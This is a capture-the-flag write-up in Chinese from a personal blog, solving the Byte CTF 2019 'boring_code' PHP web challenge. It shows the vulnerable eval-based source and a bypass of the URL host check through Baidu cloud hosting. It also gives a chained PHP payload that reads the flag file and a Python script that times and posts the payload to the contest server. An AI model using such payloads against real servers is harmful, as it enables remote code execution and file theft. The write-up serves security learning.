@@ -1,0 +1,293 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="&#x2F;code&#x2F;index.php123456789101112131415161718192021222324252627282930313233&amp;lt;?phpfunction is_valid_url($url) &amp;#123;    if (filter_var($url, FILTER_VALIDATE_URL)) &amp;#123;        if (preg_match(&amp;apos;&#x2F;data:\&#x2F;\">
+<meta name="keywords" content="bytectf2019,web,php,rce,bypass">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Byte CTF 2019 - boring_code (Web)">
+<meta property="og:url" content="https:&#x2F;&#x2F;lanceaking.github.io&#x2F;2019&#x2F;09&#x2F;08&#x2F;Byte-CTF-2019-boring-code-Web&#x2F;index.html">
+<meta property="og:site_name" content="LanceaKing&#39;s Blog">
+<meta property="og:description" content="&#x2F;code&#x2F;index.php123456789101112131415161718192021222324252627282930313233&amp;lt;?phpfunction is_valid_url($url) &amp;#123;    if (filter_var($url, FILTER_VALIDATE_URL)) &amp;#123;        if (preg_match(&amp;apos;&#x2F;data:\&#x2F;\">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https:&#x2F;&#x2F;leanote.com&#x2F;api&#x2F;file&#x2F;getImage?fileId=5d750ffdab644162bb00738c">
+<meta property="og:image" content="https:&#x2F;&#x2F;leanote.com&#x2F;api&#x2F;file&#x2F;getImage?fileId=5d751138ab644160a9007324">
+<meta property="og:image" content="https:&#x2F;&#x2F;leanote.com&#x2F;api&#x2F;file&#x2F;getImage?fileId=5d751251ab644162bb0073fb">
+<meta property="og:image" content="https:&#x2F;&#x2F;leanote.com&#x2F;api&#x2F;file&#x2F;getImage?fileId=5d7512ceab644162bb007412">
+<meta property="og:image" content="https:&#x2F;&#x2F;leanote.com&#x2F;api&#x2F;file&#x2F;getImage?fileId=5d751345ab644162bb00742c">
+<meta property="og:updated_time" content="2019-10-27T15:57:54.356Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;leanote.com&#x2F;api&#x2F;file&#x2F;getImage?fileId=5d750ffdab644162bb00738c">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>Byte CTF 2019 - boring_code (Web)</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tag/">Tag</a></li>
+         
+          <li><a href="/category/">Category</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2019/09/08/Byte-CTF-2019-EzCMS-Web/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://lanceaking.github.io/2019/09/08/Byte-CTF-2019-boring-code-Web/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://lanceaking.github.io/2019/09/08/Byte-CTF-2019-boring-code-Web/&text=Byte CTF 2019 - boring_code (Web)" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://lanceaking.github.io/2019/09/08/Byte-CTF-2019-boring-code-Web/&title=Byte CTF 2019 - boring_code (Web)" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lanceaking.github.io/2019/09/08/Byte-CTF-2019-boring-code-Web/&is_video=false&description=Byte CTF 2019 - boring_code (Web)" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Byte CTF 2019 - boring_code (Web)&body=Check out this article: https://lanceaking.github.io/2019/09/08/Byte-CTF-2019-boring-code-Web/" target="_blank" rel="noopener"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://lanceaking.github.io/2019/09/08/Byte-CTF-2019-boring-code-Web/&title=Byte CTF 2019 - boring_code (Web)" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://lanceaking.github.io/2019/09/08/Byte-CTF-2019-boring-code-Web/&title=Byte CTF 2019 - boring_code (Web)" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://lanceaking.github.io/2019/09/08/Byte-CTF-2019-boring-code-Web/&title=Byte CTF 2019 - boring_code (Web)" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://lanceaking.github.io/2019/09/08/Byte-CTF-2019-boring-code-Web/&title=Byte CTF 2019 - boring_code (Web)" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://lanceaking.github.io/2019/09/08/Byte-CTF-2019-boring-code-Web/&name=Byte CTF 2019 - boring_code (Web)&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#code-index-php"><span class="toc-number">1.</span> <span class="toc-text">/code/index.php</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#绕过url检测"><span class="toc-number">2.</span> <span class="toc-text">绕过url检测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#r-cursive改版"><span class="toc-number">3.</span> <span class="toc-text">r-cursive改版</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#造第一个点"><span class="toc-number">4.</span> <span class="toc-text">造第一个点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#造第二个点"><span class="toc-number">5.</span> <span class="toc-text">造第二个点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#payload"><span class="toc-number">6.</span> <span class="toc-text">payload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#index-php"><span class="toc-number">7.</span> <span class="toc-text">/index.php</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Byte CTF 2019 - boring_code (Web)
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">LanceaKing's Blog</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2019-09-08T13:42:42.000Z" itemprop="datePublished">2019-09-08</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/writeups/">writeups</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/bypass/" rel="tag">bypass</a>, <a class="tag-link" href="/tags/bytectf2019/" rel="tag">bytectf2019</a>, <a class="tag-link" href="/tags/php/" rel="tag">php</a>, <a class="tag-link" href="/tags/rce/" rel="tag">rce</a>, <a class="tag-link" href="/tags/web/" rel="tag">web</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="code-index-php"><a href="#code-index-php" class="headerlink" title="/code/index.php"></a>/code/index.php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid_url</span><span class="params">($url)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (filter_var($url, FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/data:\/\//i'</span>, $url)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'url'</span>]))&#123;</span><br><span class="line">    $url = $_POST[<span class="string">'url'</span>];</span><br><span class="line">    <span class="keyword">if</span> (is_valid_url($url)) &#123;</span><br><span class="line">        $r = parse_url($url);</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/baidu\.com$/'</span>, $r[<span class="string">'host'</span>])) &#123;</span><br><span class="line">            $code = file_get_contents($url);</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z]+\((?R)?\)/'</span>, <span class="keyword">NULL</span>, $code)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">'/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i'</span>, $code)) &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">'bye~'</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">eval</span>($code);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"error: host not allowed"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"error: invalid url"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="绕过url检测"><a href="#绕过url检测" class="headerlink" title="绕过url检测"></a>绕过url检测</h2><p>把payload上传百度云，然后按f12点文件按流量，就能找到一个类似的url：<br><code>https://pcsdata.baidu.com/file/c563cff04ddd...</code></p>
+<h2 id="r-cursive改版"><a href="#r-cursive改版" class="headerlink" title="r-cursive改版"></a>r-cursive改版</h2><p><code>/[a-z]+\((?R)?\)/</code>这个正则限制了只能执行至多一个参数的函数，如<code>echo(phpversion());</code>。<br><code>/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i</code>又限制了一堆函数，包括getallheaders()，所以不能像之前那样传参。<br>可以用这个脚本找出可用的函数：</p>
+<figure class="highlight php"><figcaption><span>check.php</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$fp = fopen(<span class="string">'allow_functions.txt'</span>, <span class="string">'wb'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (get_defined_functions()[<span class="string">'internal'</span>] <span class="keyword">as</span> $code) &#123;</span><br><span class="line">    $check1 = preg_match(<span class="string">'/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i'</span>, $code);</span><br><span class="line">    $check2 = preg_match(<span class="string">'/[^a-z]/'</span>, $code);</span><br><span class="line">    <span class="keyword">if</span> (!$check1 &amp;&amp; !$check2) &#123;</span><br><span class="line">        fwrite($fp, $code.PHP_EOL);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fclose($fp);</span><br></pre></td></tr></table></figure>
+<p>因为flag在上层目录的index.php里，所以我的想法是造出一个<code>.</code>，<code>scandir(&#39;.&#39;)</code>，得到<code>..</code>，<code>chdir(&#39;..&#39;)</code>，<code>scandir(&#39;.&#39;)</code>，<code>readfile(&#39;index.php&#39;)</code>。</p>
+<h2 id="造第一个点"><a href="#造第一个点" class="headerlink" title="造第一个点"></a>造第一个点</h2><p><code>.</code>的ascii码是46，chr(46)是一个好办法，但用三角函数构造46实在是太困难。<br>疯狂查函数文档，发现了<code>localtime()</code>可以把时间按数组返回：<br><img src="https://leanote.com/api/file/getImage?fileId=5d750ffdab644162bb00738c" alt="title"><br>数组第一个值是秒数，当达到46秒时，<code>pos(localtime())</code>返回46，<code>chr(pos(localtime()))</code>返回<code>.</code>，<code>chdir(next(scandir(chr(pos(localtime())))))</code>就能chdir到父目录。</p>
+<h2 id="造第二个点"><a href="#造第二个点" class="headerlink" title="造第二个点"></a>造第二个点</h2><p>localtime()其实可以传一个时间戳参数：<br><img src="https://leanote.com/api/file/getImage?fileId=5d751138ab644160a9007324" alt="title"><br>chdir成功后会返回一个true，如果直接<code>localtime(chdir(...</code>的话秒数直接为1，46就没了：<br><img src="https://leanote.com/api/file/getImage?fileId=5d751251ab644162bb0073fb" alt="title"><br>所以要找一个函数能返回一个时间戳，且秒数不变。<br>找到了mktime<br><img src="https://leanote.com/api/file/getImage?fileId=5d7512ceab644162bb007412" alt="title"><br>第一个参数是天数，返回的时间戳秒数不会变：<br><img src="https://leanote.com/api/file/getImage?fileId=5d751345ab644162bb00742c" alt="title"><br>第二个点：<code>chr(pos(localtime(mktime(chdir(...</code></p>
+<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readfile(end(scandir(chr(pos(localtime(mktime(chdir(next(scandir(chr(pos(localtime()))))))))))));</span><br></pre></td></tr></table></figure>
+<p>定时请求脚本：</p>
+<figure class="highlight python"><figcaption><span>exp.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line">payload_url = <span class="string">'https://pcsdata.baidu.com/file/c563cff04ddd...'</span></span><br><span class="line">url = <span class="string">'http://112.125.25.2:9999/code/'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    t = datetime.datetime.now().second</span><br><span class="line">    print(t, end=<span class="string">'\r'</span>)</span><br><span class="line">    <span class="keyword">if</span> t == <span class="number">46</span>:</span><br><span class="line">        print()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">r = requests.post(url, data=&#123;<span class="string">'url'</span>: payload_url&#125;)</span><br><span class="line"><span class="comment"># print(r.text)</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'out.html'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(r.content)</span><br></pre></td></tr></table></figure>
+<h2 id="index-php"><a href="#index-php" class="headerlink" title="/index.php"></a>/index.php</h2><figure class="highlight php"><figcaption><span>out.html</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// $flag = 'flag&#123;8866b40fea76845e5cbc84ad5ea9920e&#125;';</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"en"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">"viewport"</span> content=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">"X-UA-Compatible"</span> content=<span class="string">"ie=edge"</span>&gt;</span><br><span class="line">    &lt;title&gt;boring_code&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;img src=<span class="string">"https://i.loli.net/2019/09/05/XGSoguBVrQs83FU.jpg"</span> /&gt;</span><br><span class="line">&lt;!-- flag in this file <span class="keyword">and</span> code in /code --&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tag/">Tag</a></li>
+         
+          <li><a href="/category/">Category</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#code-index-php"><span class="toc-number">1.</span> <span class="toc-text">/code/index.php</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#绕过url检测"><span class="toc-number">2.</span> <span class="toc-text">绕过url检测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#r-cursive改版"><span class="toc-number">3.</span> <span class="toc-text">r-cursive改版</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#造第一个点"><span class="toc-number">4.</span> <span class="toc-text">造第一个点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#造第二个点"><span class="toc-number">5.</span> <span class="toc-text">造第二个点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#payload"><span class="toc-number">6.</span> <span class="toc-text">payload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#index-php"><span class="toc-number">7.</span> <span class="toc-text">/index.php</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://lanceaking.github.io/2019/09/08/Byte-CTF-2019-boring-code-Web/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://lanceaking.github.io/2019/09/08/Byte-CTF-2019-boring-code-Web/&text=Byte CTF 2019 - boring_code (Web)" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://lanceaking.github.io/2019/09/08/Byte-CTF-2019-boring-code-Web/&title=Byte CTF 2019 - boring_code (Web)" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lanceaking.github.io/2019/09/08/Byte-CTF-2019-boring-code-Web/&is_video=false&description=Byte CTF 2019 - boring_code (Web)" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Byte CTF 2019 - boring_code (Web)&body=Check out this article: https://lanceaking.github.io/2019/09/08/Byte-CTF-2019-boring-code-Web/" target="_blank" rel="noopener"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://lanceaking.github.io/2019/09/08/Byte-CTF-2019-boring-code-Web/&title=Byte CTF 2019 - boring_code (Web)" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://lanceaking.github.io/2019/09/08/Byte-CTF-2019-boring-code-Web/&title=Byte CTF 2019 - boring_code (Web)" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://lanceaking.github.io/2019/09/08/Byte-CTF-2019-boring-code-Web/&title=Byte CTF 2019 - boring_code (Web)" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://lanceaking.github.io/2019/09/08/Byte-CTF-2019-boring-code-Web/&title=Byte CTF 2019 - boring_code (Web)" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://lanceaking.github.io/2019/09/08/Byte-CTF-2019-boring-code-Web/&name=Byte CTF 2019 - boring_code (Web)&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2019 LanceaKing
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tag/">Tag</a></li>
+         
+          <li><a href="/category/">Category</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+    <!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<!-- clipboard -->
+
+  <script src="/lib/clipboard/clipboard.min.js"></script>
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight .code pre").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      target: function(trigger) {
+        return trigger.nextElementSibling;
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
